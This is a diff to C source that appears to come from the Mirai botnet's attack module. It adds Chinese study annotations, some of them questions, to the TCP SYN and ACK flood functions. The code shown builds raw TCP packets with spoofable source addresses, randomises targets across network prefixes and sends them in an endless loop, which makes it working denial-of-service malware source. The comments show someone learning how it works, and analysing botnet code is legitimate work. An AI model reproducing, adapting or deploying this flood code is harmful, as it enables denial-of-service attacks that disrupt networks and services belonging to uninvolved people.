@@ -32,11 +32,11 @@ void attack_tcp_syn(uint8_t targs_len, struct attack_target *targs, uint8_t opts
     BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, FALSE);
     BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, FALSE);
     BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, FALSE);
-    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, TRUE);
+    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, TRUE);  //只设置syn标志
     BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE);
-    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
+    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);//源IP？？？
 
-    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
+    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1) //原始套接字
     {
 #ifdef DEBUG
         printf("Failed to create raw socket. Aborting attack\n");
@@ -54,7 +54,7 @@ void attack_tcp_syn(uint8_t targs_len, struct attack_target *targs, uint8_t opts
         return;
     }
 
-    for (i = 0; i < targs_len; i++)
+    for (i = 0; i < targs_len; i++) //这是构造targs_len个tcp包的意思？？
     {
         struct iphdr *iph;
         struct tcphdr *tcph;
@@ -75,17 +75,17 @@ void attack_tcp_syn(uint8_t targs_len, struct attack_target *targs, uint8_t opts
             iph->frag_off = htons(1 << 14);
         iph->protocol = IPPROTO_TCP;
         iph->saddr = source_ip;
-        iph->daddr = targs[i].addr;
+        iph->daddr = targs[i].addr;//目标地址
 
         tcph->source = htons(sport);
-        tcph->dest = htons(dport);
+        tcph->dest = htons(dport);//目标端口
         tcph->seq = htons(seq);
         tcph->doff = 10;
         tcph->urg = urg_fl;
         tcph->ack = ack_fl;
         tcph->psh = psh_fl;
         tcph->rst = rst_fl;
-        tcph->syn = syn_fl;
+        tcph->syn = syn_fl;//只有syn标志为1
         tcph->fin = fin_fl;
 
         // TCP MSS
@@ -115,7 +115,7 @@ void attack_tcp_syn(uint8_t targs_len, struct attack_target *targs, uint8_t opts
         *opts++ = 6; // 2^6 = 64, window size scale = 64
     }
 
-    while (TRUE)
+    while (TRUE)//怎么退出攻击？？
     {
         for (i = 0; i < targs_len; i++)
         {
@@ -123,7 +123,7 @@ void attack_tcp_syn(uint8_t targs_len, struct attack_target *targs, uint8_t opts
             struct iphdr *iph = (struct iphdr *)pkt;
             struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
             
-            // For prefix attacks
+            // For prefix attacks   
             if (targs[i].netmask < 32)
                 iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
 
@@ -143,12 +143,13 @@ void attack_tcp_syn(uint8_t targs_len, struct attack_target *targs, uint8_t opts
                 tcph->urg_ptr = rand_next() & 0xffff;
 
             iph->check = 0;
-            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
+            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));//求ip校验和
 
             tcph->check = 0;
-            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + 20), sizeof (struct tcphdr) + 20);
+            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + 20), sizeof (struct tcphdr) + 20);//求tcp校验和
 
             targs[i].sock_addr.sin_port = tcph->dest;
+            //发送构造的raw socket包给目标地址
             sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + 20, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
         }
 #ifdef DEBUG
@@ -172,7 +173,7 @@ void attack_tcp_ack(uint8_t targs_len, struct attack_target *targs, uint8_t opts
     uint32_t seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
     uint32_t ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACKRND, 0xffff);
     BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, FALSE);
-    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, TRUE);
+    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, TRUE);//只设置ack
     BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, FALSE);
     BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, FALSE);
     BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, FALSE);
